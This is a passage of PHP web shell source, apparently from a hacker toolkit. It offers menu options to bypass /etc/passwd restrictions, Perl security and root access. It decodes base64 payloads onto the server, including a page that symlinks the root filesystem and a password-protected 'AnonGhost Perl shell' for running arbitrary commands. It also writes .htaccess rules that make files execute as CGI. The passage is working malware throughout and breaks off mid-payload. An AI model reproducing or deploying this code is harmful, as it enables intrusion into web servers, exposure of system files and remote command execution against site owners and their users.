echo "<li> <a href='?dir=$dir&do=baper'>Bypass Perl Security</a> </li>";
echo "<li> <a href='?dir=$dir&do=barut'>Bypass Root Access</a> </li>";
echo "<li> <a href='?dir=$dir&do=com64'>Base64 Command</a> </li>";
echo "</ul>";
echo "</center>";
		echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Root Path with system function</span><center><br>';
		mkdir('bforb', 0755);
		chdir('bforb');
		$bforb = 'PGhlYWQ+PHRpdGxlPkJ5cGFzcyBCeXBhc3MgUm9vdCBQYXRoIGJ5IGRlbml0YSBXb3JtPC90aXRsZT48L2hlYWQ+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3Lmljb25qLmNvbS9pY28vYy91L2N1MWJtcGdiMWsuaWNvIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj48IS0tIGJvZHkge2JhY2tncm91bmQtY29sb3I6IHRyYW5zcGFyZW50OyBmb250LWZhbWlseTpDb3VyaWVyCW1hcmdpbi1sZWZ0OiAwcHg7IG1hcmdpbi10b3A6IDBweDsgdGV4dC1hbGlnbjogY2VudGVyOyBOZXc7Zm9udC1zaXplOjEycHg7Y29sb3I6IzAwOTkwMDtmb250LXdlaWdodDo0MDA7fSBhe3RleHQtZGVjb3JhdGlvbjpub25lO30gYTpsaW5rIHtjb2xvcjojMDA5OTAwO30gYTp2aXNpdGVkIHtjb2xvcjojMDA3NzAwO30gYTpob3Zlcntjb2xvcjojMDBmZjAwO30gYTphY3RpdmUge2NvbG9yOiMwMDk5MDA7fSAtLT48IS0tIE1hZGUgQnkgZGVuaXRhIFdvcm0gLS0+PC9zdHlsZT48YnI+PGJyPjxib2R5IGJnQ29sb3I9IjAwMDAwMCI+PHRyPjx0ZD48P3BocCBlY2hvICI8Zm9ybSBtZXRob2Q9J1BPU1QnIGFjdGlvbj0nJz4iIDsgZWNobyAiPGNlbnRlcj48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nQnlwYXNzIGl0JyBuYW1lPSdkZW5pdGEnPjwvY2VudGVyPiI7IGlmIChpc3NldCgkX1BPU1RbJ2Rlbml0YSddKSl7IHN5c3RlbSgnbG4gLXMgLyBkZW5pdGEudHh0Jyk7ICRmdmNrZW0gPSdUM0IwYVc5dWN5QkpibVJsZUdWeklFWnZiR3h2ZDFONWJVeHBibXR6RFFwRWFYSmxZM1J2Y25sSmJtUmxlQ0J6YzNOemMzTXVhSFJ0RFFwQlpHUlVlWEJsSUhSNGRDQXVjR2h3RFFwQlpHUklZVzVrYkdWeUlIUjRkQ0F1Y0dodyc7JGZpbGUgPSBmb3BlbigiLmh0YWNjZXNzIiwidysiKTskd3JpdGUgPSBmd3JpdGUgKCRmaWxlICxiYXNlNjRfZGVjb2RlKCRmdmNrZW0pKTskZGVuaXRhID0gc3ltbGluaygiLyIsImRlbml0YS50eHQiKTskcnQ9Ijxicj48YSBocmVmPWRlbml0YS50eHQgVEFSR0VUPSdfYmxhbmsnPjxmb250IGNvbG9yPSMwMGJiMDAgc2l6ZT0yIGZhY2U9J0NvdXJpZXIgTmV3Jz48Yj5CeXBhc3NlZCBTdWNjZXNzZnVsbHk8L2I+PC9mb250PjwvYT4iO2VjaG8gIjxicj48YnI+PGI+RG9uZS4uICE8L2I+PGJyPjxicj5DaGVjayBsaW5rIGdpdmVuIGJlbG93IGZvciAvIGZvbGRlciBzeW1saW5rIDxicj4kcnQ8L2NlbnRlcj4iO30gZWNobyAiPC9mb3JtPiI7ICA/PjwvdGQ+PC90cj48L2JvZHk+PC9odG1sPg==';

		$file = fopen("bforb.php" ,"w+");
		$write = fwrite ($file ,base64_decode($bforb));
		fclose($file);
		chmod("bforb.php",0755);
		echo "<iframe src=bforb/bforb.php width=60% height=60% frameborder=0></iframe>";

}
elseif($_GET['do'] == 'baper') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=betc'>Bypass /etc/passwd</a> </li>";
echo "<li> <a href='?dir=$dir&do=baus'>Bypass User Server</a> </li>";
echo "<li> <a href='?dir=$dir&do=baper'>Bypass Perl Security</a> </li>";
echo "<li> <a href='?dir=$dir&do=barut'>Bypass Root Access</a> </li>";
echo "<li> <a href='?dir=$dir&do=com64'>Base64 Command</a> </li>";
echo "</ul>";
echo "</center>";
		mkdir('cgipl', 0755);
		chdir('cgipl');
		$kokdosya = ".htaccess";
		$dosya_adi = "$kokdosya";
		$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
		$metin = "AddType application/x-httpd-cgi .root 
		AddType application/x-httpd-cgi .root 
		AddHandler cgi-script .root 
		AddHandler cgi-script .root";    
		fwrite ( $dosya , $metin ) ;
		fclose ($dosya);
		$cgipl = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjojZmZmZjY2Ij5Bbm9uR2hvc3QgUGVybCBzaGVsbDwvYj4gIyBzZXJ2ZXINCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyDQojIHZhbHVlcyBzaG91bGQgd29yayBmaW5lIGZvciBtb3N0IHN5c3RlbXMuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQokUGFzc3dvcmQgPSAiZ2hvc3QiOwkJIyBDaGFuZ2UgdGhpcy4gWW91IHdpbGwgbmVlZCB0byBlbnRlciB0aGlzDQoJCQkJIyB0byBsb2dpbi4NCg0KJFdpbk5UID0gMDsJCQkjIFlvdSBuZWVkIHRvIGNoYW5nZSB0aGUgdmFsdWUgb2YgdGhpcyB0byAxIGlmDQoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQNCgkJCQkjIG1hY2hpbmUuIElmIHlvdSdyZSBydW5uaW5nIGl0IG9uIFVuaXgsIHlvdQ0KCQkJCSMgY2FuIGxlYXZlIHRoZSB2YWx1ZSBhcyBpdCBpcy4NCg0KJE5UQ21kU2VwID0gIiYiOwkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFdpbmRvd3MgTlQuDQoNCiRVbml4Q21kU2VwID0gIjsiOwkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkDQoJCQkJIyBEb24ndCBzZXQgdGhpcyB0byBhIHZlcnkgbGFyZ2UgdmFsdWUuIFRoaXMgaXMNCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0DQoJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLg0KCQkJCSMgVGhpcyBpcyB2YWxpZCBvbmx5IG9uIFVuaXggc2VydmVycy4gSXQgaXMNCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4NCg0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsJCSMgSWYgdGhpcyBpcyAxLCB0aGVuIGRhdGEgaXMgc2VudCB0byB0aGUNCgkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQ0KCQkJCSMgaXQgaXMgYnVmZmVyZWQgYW5kIHNlbmQgd2hlbiB0aGUgY29tbWFuZA0KCQkJCSMgY29tcGxldGVzLiBUaGlzIGlzIHVzZWZ1bCBmb3IgY29tbWFuZHMgbGlrZQ0KCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0DQoJCQkJIyBpcyBiZWluZyBnZW5lcmF0ZWQuDQoNCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISENCg0KJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7DQokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7DQokUGF0aFNlcCA9ICgkV2luTlQgPyAiXFwiIDogIi8iKTsNCiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmVhZHMgdGhlIGlucHV0IHNlbnQgYnkgdGhlIGJyb3dzZXIgYW5kIHBhcnNlcyB0aGUgaW5wdXQgdmFyaWFibGVzLiBJdA0KIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLg0KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbnsnZid9IGFuZCB0aGUgZGF0YSBpcyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9Lg0KIyBPdGhlciB2YXJpYWJsZXMgY2FuIGJlIGFjY2Vzc2VkIHVzaW5nICRpbnsndmFyJ30sIHdoZXJlIHZhciBpcyB0aGUgbmFtZSBvZg0KIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQ0KIyBzY3JpcHRzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJlYWRQYXJzZSANCnsNCglsb2NhbCAoKmluKSA9IEBfIGlmIEBfOw0KCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7DQoJDQoJJE11bHRpcGFydEZvcm1EYXRhID0gJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC87DQoNCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQ0KCXsNCgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQoJfQ0KCWVsc2lmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIlBPU1QiKQ0KCXsNCgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOw0KCQlyZWFkKFNURElOLCAkaW4sICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOw0KCX0NCg0KCSMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCgl7DQoJCSRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcgDQoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IA0KCQkkSGVhZGVyQm9keSA9ICRsaXN0WzFdOw0KCQkkSGVhZGVyQm9keSA9fiAvXHJcblxyXG58XG5cbi87DQoJCSRIZWFkZXIgPSAkYDsNCgkJJEJvZHkgPSAkJzsNCiAJCSRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUNCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7DQoJCSRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgDQoJCSRpbnsnZid9ID0gJDE7IA0KCQkkaW57J2YnfSA9fiBzL1wiLy9nOw0KCQkkaW57J2YnfSA9fiBzL1xzLy9nOw0KDQoJCSMgcGFyc2UgdHJhaWxlcg0KCQlmb3IoJGk9MjsgJGxpc3RbJGldOyAkaSsrKQ0KCQl7IA0KCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87DQoJCQkkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87DQoJCQkka2V5ID0gJDE7DQoJCQkkdmFsID0gJCc7DQoJCQkkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSA9ICR2YWw7IA0KCQl9DQoJfQ0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KCXsNCgkJQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KCQlmb3JlYWNoICRpICgwIC4uICQjaW4pDQoJCXsNCgkJCSRpblskaV0gPX4gcy9cKy8gL2c7DQoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCgkJCSRpbnska2V5fSAuPSAkdmFsOw0KCQl9DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRlcg0KIyBBcmd1bWVudCAxOiBGb3JtIGl0ZW0gbmFtZSB0byB3aGljaCBmb2N1cyBzaG91bGQgYmUgc2V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlSGVhZGVyDQp7DQoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQoJJEVuY29kZWRDdXJyZW50RGlyID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCglwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCglwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8dGl0bGU+QW5vbkdob3N0IFBlcmwgc2hlbGw8L3RpdGxlPg0KJEh0bWxNZXRhSGVhZGVyDQoNCjxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJBbm9uR2hvc3QsQW5vbkdob3N0LEFub25HaG9zdC5pbmZvLGhhY2tlciI+DQo8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iQW5vbkdob3N0LEFub25HaG9zdCxBbm9uR2hvc3QuaW5mbyxoYWNrZXIiPg0KPC9oZWFkPg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IiNGRkZGRkYiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCIgdGV4dD0iI0ZGMDAwMCI+DQo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4NCjx0cj4NCjx0ZCBiZ2NvbG9yPSIjRkZGRkZGIiBib3JkZXJjb2xvcj0iI0ZGRkZGRiIgYWxpZ249ImNlbnRlciIgd2lkdGg9IjElIj4NCjxiPjxmb250IHNpemU9IjIiPiM8L2ZvbnQ+PC9iPjwvdGQ+DQo8dGQgYmdjb2xvcj0iI0ZGRkZGRiIgd2lkdGg9Ijk4JSI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+PGI+IA0KPGIgc3R5bGU9ImNvbG9yOmJsYWNrO2JhY2tncm91bmQtY29sb3I6I2ZmZmY2NiI+QW5vbkdob3N0IFBlcmwgc2hlbGw8L2I+IENvbm5lY3RlZCB0byAkU2VydmVyTmFtZTwvYj48L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYmdjb2xvcj0iI0ZGRkZGRiI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+DQoNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXVwbG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPlVwbG9hZCBGaWxlPC9mb250PjwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+RG93bmxvYWQgRmlsZTwvZm9udD48L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPkRpc2Nvbm5lY3Q8L2ZvbnQ+PC9hPiB8DQo8L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPGZvbnQgc2l6ZT0iMyI+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5TY3JlZW4NCnsNCgkkTWVzc2FnZSA9IHEkPHByZT48aW1nIGJvcmRlcj0iMCIgc3JjPSJodHRwOi8vaW1nODEwLmltYWdlc2hhY2sudXMvaW1nODEwLzgwNDMvQW5vbkdob3N0MTIucG5nIj48L3ByZT48YnI+PGJyPjwvZm9udD48aDE+RGVmYXVsdCBQYXNzd29yZD1naG9zdDwvaDE+DQokOw0KIycNCglwcmludCA8PEVORDsNCjxjb2RlPg0KDQpUcnlpbmcgJFNlcnZlck5hbWUuLi48YnI+DQpDb25uZWN0ZWQgdG8gJFNlcnZlck5hbWU8YnI+DQpFc2NhcGUgY2hhcmFjdGVyIGlzIF5dDQo8Y29kZT4kTWVzc2FnZQ0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5GYWlsZWRNZXNzYWdlDQp7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxicj5sb2dpbjogYWRtaW48YnI+DQpwYXNzd29yZDo8YnI+DQpMb2dpbiBpbmNvcnJlY3Q8YnI+PGJyPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gZm9yIGxvZ2dpbmcgaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRm9ybQ0Kew0KCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImxvZ2luIj4NCjwvZm9udD4NCjxmb250IHNpemU9IjMiPg0KbG9naW46IDxiIHN0eWxlPSJjb2xvcjpibGFjaztiYWNrZ3JvdW5kLWNvbG9yOiNmZmZmNjYiPkFub25HaG9zdCBQZXJsIHNoZWxsPC9iPjxicj4NCnBhc3N3b3JkOjwvZm9udD48Zm9udCBjb2xvcj0iIzAwOTkwMCIgc2l6ZT0iMyI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIGZvb3RlciBmb3IgdGhlIEhUTUwgUGFnZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KCXByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlDQojIHZhcmlhYmxlICRDb29raWVzeycnfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEdldENvb2tpZXMNCnsNCglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KCWZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpDQoJew0KCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7DQoJCSRDb29raWVzeyRpZH0gPSAkdmFsOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dvdXRTY3JlZW4NCnsNCglwcmludCAiPGNvZGU+Q29ubmVjdGlvbiBjbG9zZWQgYnkgZm9yZWlnbiBob3N0Ljxicj48YnI+PC9jb2RlPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2Fpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dvdXQNCnsNCglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llDQoJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCSZQcmludExvZ291dFNjcmVlbjsNCg0KCSZQcmludExvZ2luU2NyZWVuOw0KCSZQcmludExvZ2luRm9ybTsNCgkmUHJpbnRQYWdlRm9vdGVyOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGxvZ2luIHRoZSB1c2VyLiBJZiB0aGUgcGFzc3dvcmQgbWF0Y2hlcywgaXQNCiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QNCiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyDQojIHRvIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkDQoJew0KCQlwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9JExvZ2luUGFzc3dvcmQ7XG4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCgllbHNlICMgcGFzc3dvcmQgZGlkbid0IG1hdGNoDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJCSZQcmludExvZ2luU2NyZWVuOw0KCQlpZigkTG9naW5QYXNzd29yZCBuZSAiIikgIyBzb21lIHBhc3N3b3JkIHdhcyBlbnRlcmVkDQoJCXsNCgkJCSZQcmludExvZ2luRmFpbGVkTWVzc2FnZTsNCg0KCQl9DQoJCSZQcmludExvZ2luRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgY29tbWFuZHMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtDQp7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJcHJpbnQgPDxFT